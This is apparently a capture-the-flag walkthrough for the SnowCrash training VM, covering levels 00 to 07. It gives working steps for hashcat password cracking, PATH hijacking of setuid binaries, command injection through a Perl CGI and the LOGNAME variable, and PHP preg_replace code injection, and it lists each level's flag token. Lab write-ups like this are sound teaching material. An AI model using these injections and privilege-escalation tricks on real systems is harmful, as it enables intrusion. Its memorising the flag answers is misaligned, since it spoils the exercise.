# flag 00

cd /
find / -user flag00
cat /rofs/usr/sbin/john

cdiiddwpgswtgt

code césar > 15
nottoohardhere

## Flag : x24ti5gi3x0ol2eh4esiuxias


# flag 01

cat /etc/passwd | grep flag01
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash


hashcat -m 1500 42hDRfypTqqnw rockyou.txt
42hDRfypTqqnw:abcdefg                                     
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1500 (descrypt, DES (Unix), Traditional DES)
Hash.Target......: 42hDRfypTqqnw
Time.Started.....: Sun Feb 22 12:46:26 2026 (0 secs)
Time.Estimated...: Sun Feb 22 12:46:26 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 36298.6 kH/s (5.82ms) @ Accel:512 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 676973/14344384 (4.72%)
Rejected.........: 152685/676973 (22.55%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> clyde8
Hardware.Mon.#1..: Temp: 63c Util:  0% Core:1500MHz Mem:6001MHz Bus:8

Started: Sun Feb 22 12:46:18 2026
Stopped: Sun Feb 22 12:46:27 2026

## Flag : f2av5il02puano7naaf6adaaf

# flag 02

ouvrir level02.pcap dans wireshark

après le paquet "password:" reçu ft_wandr(DEL)(DEL)(DEL)NDRel(DEL)L0L
ft_waNDReL0L

## Flag : kooda2puivaav1idi4f57q8iq

# flag03

ouverture de level03 (executable dans ghidra):
setresgid et setresuid avec l'user flag03
et ensuite la commande executée est /usr/bin/env echo Exploit me

il suffit de créer un executable nommée echo et le mettre plus tôot dans le PATH:

cd ..
chmod 777 level03
(set les permissions pour écrire dans notre home)
nano echo

#!/bin/bash

getflag

export PATH="/home/user/level03:$PATH"

chmod +x echo

./level03

## flag : qi0maab88jeaj46qoumi7maus

# Flag04

le code de level04.pl ne semble pas sanitize le parametre qui peut etre passé au serveur http de ce fait en passant x=$(commande) la commande est executée dans le print du echo.

curl "http://localhost:4747/level04.pl?x=\$(whoami)"
flag04

curl "http://localhost:4747/?x=\$(getflag)"
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

## flag : ne2searoevaevoem4ov4ar8ap

# Flag05

find / -user flag05
cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done


aucune difficulté à comprendre que n'importe quoi va etre executé depuis /opt/openarenaserver/


et vu qu'on a les permission d'écriture il suffit de faire un .sh avec 
#!/bin/bash

getflag | wall
pour broadcast le flag a tous les utilisateurs connectés

Broadcast Message from flag05@Snow                                             
        (somewhere) at 15:32 ...                                               
                                                                               
Check flag.Here is your token : viuaaale9huek52boumoomioc 

## flag : viuaaale9huek52boumoomioc

# Flag 06

./level06 test s
PHP Notice:  Undefined variable: system in /home/user/level06/level06.php(4) : regexp code on line 1
(getflag)
level06@SnowCrash:~$ cat test
[x $system(getflag)]

[x {${system(getflag)}}]

./level06 test s
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1

## flag : wiok45aaoguiboiki2tuin6ub

# Flag 07

quand on ouvre le binaire dans ghidra:
int main(int argc,char **argv,char **envp)

{
  char *pcVar1;
  int iVar2;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;
  
                    /* Unresolved local var: char * buffer@[DW_OP_breg4(ESP): +20]
                       Unresolved local var: gid_t gid@[DW_OP_breg4(ESP): +24]
                       Unresolved local var: uid_t uid@[DW_OP_breg4(ESP): +28] */
  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  pcVar1 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
  iVar2 = system(local_1c);
  return iVar2;
}

on s'aperçoit que il recupère une variable d'env nommée LOGNAME. avec cette information on peut donc faire une injection de commande comme celà:
export LOGNAME="salut ; getflag"

et quand on execute:
./level07 
salut
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h

## flag : fiumuikeil55xe9cu4dood66h

# Flag 08


